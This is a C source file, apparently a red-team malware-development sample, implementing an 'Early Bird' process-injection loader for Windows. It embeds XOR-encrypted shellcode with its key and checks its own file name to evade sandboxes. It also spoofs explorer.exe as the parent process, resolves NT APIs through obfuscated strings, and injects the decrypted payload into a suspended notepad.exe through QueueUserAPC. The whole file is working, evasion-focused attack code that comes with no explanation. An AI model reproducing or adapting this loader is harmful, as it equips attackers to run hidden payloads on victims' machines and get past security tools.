

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
#include "helpers.h"
#include "PEstructs.h"


unsigned char payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa9, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x34, 0x2b, 0x43, 0xb7, 0x11, 0x23, 0xee, 0x37, 0x5, 0x3b, 0x31, 0xf8, 0x37, 0x7b, 0x3a, 0xee, 0x26, 0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x34, 0x42, 0xac, 0x2b, 0x7d, 0xd2, 0x3e, 0x21, 0x2d, 0x54, 0xa5, 0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88, 0x31, 0x33, 0x34, 0x3c, 0xe0, 0x37, 0x45, 0xee, 0x2f, 0x45, 0x3b, 0x64, 0xb3, 0x14, 0xe4, 0xc, 0x73, 0x6e, 0x67, 0x6a, 0xe8, 0xb, 0x73, 0x65, 0x63, 0xf9, 0xe5, 0xfc, 0x6b, 0x65, 0x65, 0x2d, 0xe8, 0xb9, 0x7, 0x2, 0x2b, 0x73, 0xb5, 0xff, 0x23, 0x7d, 0x21, 0xee, 0x2d, 0x59, 0x3a, 0x64, 0xb3, 0x22, 0x86, 0x22, 0x26, 0x54, 0xac, 0x2d, 0x92, 0xb0, 0x32, 0xee, 0x57, 0xfa, 0x2d, 0x75, 0xbd, 0x2d, 0x54, 0xa5, 0x2c, 0xb8, 0xba, 0x68, 0xcf, 0x33, 0x64, 0xb5, 0x53, 0x85, 0x10, 0x94, 0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x3d, 0x21, 0xe6, 0x39, 0x57, 0x2c, 0x62, 0xa2, 0x3, 0x35, 0xe0, 0x69, 0x2d, 0x21, 0xe6, 0x39, 0x6f, 0x2c, 0x62, 0xa2, 0x24, 0xff, 0x6f, 0xed, 0x24, 0x3d, 0x2c, 0x21, 0x3b, 0x64, 0xb3, 0x2c, 0x3c, 0x2e, 0x2a, 0x3d, 0x24, 0x3c, 0x2c, 0x23, 0x3b, 0xe6, 0x8f, 0x52, 0x24, 0x26, 0x94, 0x85, 0x3d, 0x24, 0x34, 0x23, 0x3b, 0xee, 0x71, 0x9b, 0x2e, 0x8b, 0x94, 0x9a, 0x38, 0x2d, 0x5c, 0xa2, 0x20, 0x2c, 0xdd, 0x5, 0xc, 0x1a, 0x2, 0xb, 0x0, 0x11, 0x6d, 0x38, 0x25, 0x2d, 0xea, 0x93, 0x2c, 0xb3, 0xa9, 0x29, 0x12, 0x43, 0x6a, 0x86, 0xa6, 0x36, 0x30, 0x3a, 0xec, 0x95, 0x38, 0x3f, 0x28, 0x54, 0xad, 0x34, 0x42, 0xac, 0x30, 0x21, 0x2c, 0xce, 0x51, 0x33, 0x1c, 0xc2, 0x6d, 0x79, 0x73, 0x65, 0x9c, 0xa7, 0x8d, 0x79, 0x6b, 0x65, 0x65, 0x54, 0x5e, 0x57, 0x40, 0x5d, 0x4d, 0x43, 0x56, 0x44, 0x45, 0x5c, 0x5c, 0x65, 0x37, 0x31, 0xfa, 0xa4, 0x2a, 0xb5, 0xa5, 0xcf, 0x6a, 0x65, 0x65, 0x28, 0x5c, 0xb0, 0x20, 0x36, 0x9, 0x71, 0x36, 0x3d, 0xd1, 0x32, 0xec, 0xfa, 0xab, 0x79, 0x73, 0x65, 0x63, 0x8d, 0xb0, 0x9c, 0x8e, 0x65, 0x65, 0x65, 0x42, 0x38, 0x3c, 0x23, 0x54, 0x2d, 0x54, 0x43, 0x0, 0x9, 0xd, 0x35, 0x1b, 0x0, 0x6, 0x52, 0x2a, 0x18, 0x24, 0x41, 0x5a, 0x14, 0x2, 0x29, 0x1c, 0x3e, 0x29, 0x28, 0x33, 0x17, 0x35, 0x37, 0x22, 0xf, 0x36, 0x5d, 0x3, 0xe, 0x2b, 0x35, 0x22, 0x1c, 0x57, 0x21, 0x5a, 0x2, 0x21, 0x54, 0x58, 0x31, 0x1b, 0x3, 0xa, 0x0, 0x1, 0x15, 0x27, 0x5d, 0x33, 0x2f, 0x6, 0x31, 0x34, 0x12, 0x13, 0x16, 0x51, 0x37, 0x8, 0x15, 0x54, 0x1f, 0x40, 0x36, 0x26, 0x6, 0x15, 0x7, 0x14, 0x15, 0x3a, 0x14, 0x2f, 0x7, 0x5c, 0x18, 0x6, 0xf, 0xa, 0x3f, 0x5d, 0x15, 0x5c, 0x27, 0x26, 0x3, 0x5f, 0x37, 0x0, 0x1c, 0x31, 0x6, 0x24, 0x46, 0x52, 0x52, 0x23, 0xb, 0x32, 0x11, 0x30, 0x1c, 0x27, 0x1d, 0x30, 0x42, 0x5, 0x20, 0x1, 0x2a, 0x59, 0x9, 0x45, 0xe, 0x54, 0x1e, 0x1d, 0x3a, 0x18, 0x56, 0x2c, 0x56, 0x20, 0x33, 0x38, 0x2c, 0xa, 0x4, 0x30, 0x41, 0x33, 0x2c, 0x52, 0x10, 0x2a, 0x1c, 0x19, 0x29, 0x31, 0x3c, 0x10, 0x36, 0x5c, 0x32, 0x2e, 0x1c, 0xf, 0x17, 0x16, 0x36, 0x14, 0x4, 0x2d, 0x26, 0x5e, 0x11, 0x33, 0xf, 0x5b, 0x1c, 0x22, 0x2e, 0x15, 0x23, 0x35, 0x3f, 0x25, 0x56, 0x5c, 0x21, 0x9, 0x18, 0x4b, 0x17, 0x50, 0x3c, 0x3c, 0xc, 0x5d, 0xc, 0x55, 0xe, 0x2e, 0x8, 0x27, 0x16, 0xd, 0x1b, 0x20, 0x23, 0x1a, 0xc, 0x24, 0x21, 0x26, 0xd, 0x1f, 0x30, 0x39, 0x16, 0xb, 0x18, 0x5e, 0x2d, 0x14, 0x14, 0x5, 0x32, 0x3e, 0x13, 0x4, 0x2d, 0x26, 0x26, 0x53, 0x12, 0x31, 0x36, 0x6d, 0x31, 0xfa, 0xa4, 0x30, 0x28, 0x24, 0x2c, 0x26, 0x54, 0xac, 0x36, 0x25, 0xc1, 0x73, 0x57, 0xcb, 0xf6, 0x65, 0x74, 0x6b, 0x65, 0x35, 0x36, 0x3e, 0x30, 0xb4, 0xa7, 0x88, 0x27, 0x4b, 0x4f, 0x94, 0xb0, 0x2d, 0xec, 0xab, 0x13, 0x79, 0x3a, 0x2b, 0xfb, 0x94, 0x1e, 0x74, 0x3f, 0x37, 0xd, 0xed, 0x4a, 0x73, 0x65, 0x2a, 0xfb, 0x85, 0x1e, 0x6f, 0x24, 0x3c, 0x2c, 0xd7, 0xc, 0x35, 0xfb, 0xe5, 0x72, 0x65, 0x74, 0x6b, 0x9a, 0xb0, 0x28, 0x5c, 0xb9, 0x20, 0x3f, 0x2b, 0xfb, 0x94, 0x39, 0x5a, 0xac, 0x28, 0x54, 0xa4, 0x2a, 0x20, 0x2c, 0xa4, 0xb0, 0x48, 0x72, 0x73, 0x1e, 0x9a, 0xb0, 0xe8, 0xb9, 0x6, 0x7a, 0x2b, 0xb5, 0xa4, 0xfc, 0x78, 0x65, 0x65, 0x2c, 0xd7, 0x3d, 0x83, 0x50, 0x83, 0x72, 0x65, 0x74, 0x6b, 0x9a, 0xb0, 0x2d, 0x92, 0xb6, 0x7, 0x67, 0x88, 0xd8, 0x8d, 0x21, 0x6b, 0x65, 0x65, 0x36, 0x34, 0x13, 0x33, 0x3f, 0x2a, 0xfb, 0xb4, 0xb5, 0x89, 0x75, 0x2c, 0xa2, 0xad, 0x79, 0x63, 0x65, 0x63, 0x3b, 0xdf, 0x2c, 0xcf, 0x36, 0x80, 0x65, 0x6d, 0x79, 0x73, 0x9a, 0xb6, 0x3a, 0xf6, 0x27, 0x38, 0x2d, 0xec, 0x82, 0x25, 0xf0, 0x82, 0x2d, 0xea, 0xa8, 0x2c, 0xb3, 0xab, 0x65, 0x45, 0x65, 0x6d, 0x30, 0xfa, 0x9c, 0x2a, 0xc8, 0x77, 0xe2, 0xe2, 0x87, 0x65, 0x65, 0x6d, 0x79, 0x8c, 0xb0, 0x2b, 0xf1, 0xa1, 0x54, 0xee, 0xa5, 0x11, 0xd7, 0xb, 0xf2, 0x74, 0x2d, 0x62, 0xb1, 0xe0, 0xb4, 0x1e, 0xb7, 0x3d, 0xa6, 0x35, 0x13, 0x73, 0x3c, 0x2a, 0xb5, 0xa7, 0x84, 0xde, 0xc7, 0x33, 0x9a, 0xb8 };
char key[] = "mysecretkeee";
SIZE_T payload_len = sizeof(payload);
SIZE_T payload_len2 = sizeof(payload);
NTSTATUS success;

int main(int argc, char* argv[])
{
	//simple sandbox evasion trick
	if (strstr(argv[0], "EarlyBird.exe") == 0)
	{
		return 0;
	}
	
	int pid;
	HANDLE hProc = NULL;

	//STARTUPINFO si;
	STARTUPINFOEX si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	LPVOID pRemoteCode = NULL;
	//void* pRemoteCode;
	//taken from https://captmeelo.com/redteam/maldev/2021/11/22/picky-ppid-spoofing.html
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

	pid = FindTarget();
	printf("Explorer PID: %d\n", pid);
	OBJECT_ATTRIBUTES oa;
	oa = { sizeof(oa) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	// strings
	WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
	char Op3npr0[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s',0 };
	WCHAR k3rn3l[] = {'K','e','r','n','e','l','3','2','.','d','l','l',0};
	char qu3u3[] = { 'Q','u','e','u','e','U','s','e','r','A','P','C',0 };

	myNtOpenProcess pOpenProcess = (myNtOpenProcess)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), Op3npr0);
	NTSTATUS p = pOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_PROCESS, &oa, &clientId); //PROCESS_CREATE_PROCESS is necessary for PPID spoofing
	if (hProc != NULL && p == 0x00000000)
		printf("[+] Handle to process obtained!!\n");
	
	if(UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL)!=0)
		printf("Process props updated\n");
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
	/*
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	*/
	
	// EXTENDED_STARTUPINFO_PRESENT is necessary for PPID spoofing
	if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
		printf("Failed to create process. Error code: %u", GetLastError());

	//XOR((char*)payload, payload_len, (char*)key, sizeof(key));
	char alloc[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
	myNtAllocateVirtualMemory pAllocMem = (myNtAllocateVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), alloc);
	success = pAllocMem(pi.hProcess, &pRemoteCode, 0, &payload_len, MEM_COMMIT, PAGE_READWRITE); // we allocate buffer for our payload
	if (success == 0x00000000)
		printf("PID: %d\n[+] RW buffer created: %p\n",pi.dwProcessId, pRemoteCode);

	XOR((char*)payload, payload_len2, (char*)key, sizeof(key));


	char write[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	myNtWriteVirtualMemory pWriteMem = (myNtWriteVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), write);
	success = pWriteMem(pi.hProcess, pRemoteCode, (PVOID)payload, payload_len, (SIZE_T*)NULL); //we copy our payload to the buffer
	//printf("[+] myNtWriteVirtualMemory failed! Last error: %u\n", GetLastError());
	printf("Location of remote code: %p\n", pRemoteCode);
	if (success == 0x00000000)
		printf("[+] Payload successfully copied\n");
	
	char protect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	myNtProtectVirtualMemory pVirtualProtect = (myNtProtectVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), protect);
	DWORD old = 0;
	success = pVirtualProtect(pi.hProcess, &pRemoteCode, (PULONG)&payload_len, PAGE_EXECUTE_READ, &old); //we make the remote buffer RX
	if (success == 0x00000000)
		printf("[+] Permissions changed to RX\n");
	
	myQueueUserAPC pQueueUserAPC = (myQueueUserAPC)hlpGetProcAddress(hlpGetModuleHandle(k3rn3l), qu3u3);
	if (!pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL))
		printf("QueueUserAPC Failed");
	//QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

	printf("pload = %p ; remcode = %p\n", payload, pRemoteCode);
	//getchar();
	ResumeThread(pi.hThread);

	return 0;
}

